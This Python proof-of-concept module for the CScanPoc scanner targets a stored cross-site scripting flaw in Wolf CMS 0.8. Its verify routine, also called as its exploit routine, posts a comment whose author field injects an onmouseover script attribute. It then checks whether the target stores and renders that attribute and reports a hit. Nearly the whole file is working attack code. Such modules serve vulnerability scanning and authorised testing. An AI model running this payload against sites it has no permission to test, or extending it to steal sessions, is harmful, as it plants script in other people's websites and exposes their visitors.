# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WolfCMS_0101'  # 平台漏洞编号
    name = 'Wolf CMS存储型跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2016-10-14'  # 漏洞公布时间
    desc = '''模版漏洞描述
    Wolf CMS是Wolf CMS团队开发的一套基于PHP的开源内容管理系统（CMS）。该系统提供用户界面、模板、用户管理和权限管理等功能。 
    Wolf CMS 0.8版本存在存储型跨站脚本漏洞，该漏洞源于程序未能充分过滤用户提交的HTTP Referer header。攻击者可利用该漏洞窃取基于cookie的身份验证或注入恶意脚本。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-08904'  # 漏洞来源
    cnvd_id = 'CNVD-2016-08904'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WolfCMS'  # 漏洞组件名称
    product_version = '0.8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c0c0847e-56ef-4a96-85e8-893a6b2906ac'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/wolfCMS/?about-us/sdgdfgdfsg.html"
            vul_url = self.target + payload
            data = '''comment%5Bauthor_name%5D=%22+onmouseover%3Dprompt%28%221337%22%29+bad%3D%22&comment%5Bauthor_email%5D=xss%40xss.xss&comment%5Bauthor_link%5D=website&comment%5Bauthor_ip%5D=127.0.0.1&comment%5Bbody%5D=Test+2+Cross+Site+Vulnerability+%28XSS%29&commit-comment=Submit+comment'''
            _response = requests.post(vul_url, data=data)
            if _response.code == 200 and '''<p> à <a  href="http://website" title="" onmouseover=prompt("1337") bad="">" onmouseover=prompt("1337") bad="</a> <small class="comment-date"></small></p>''' in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
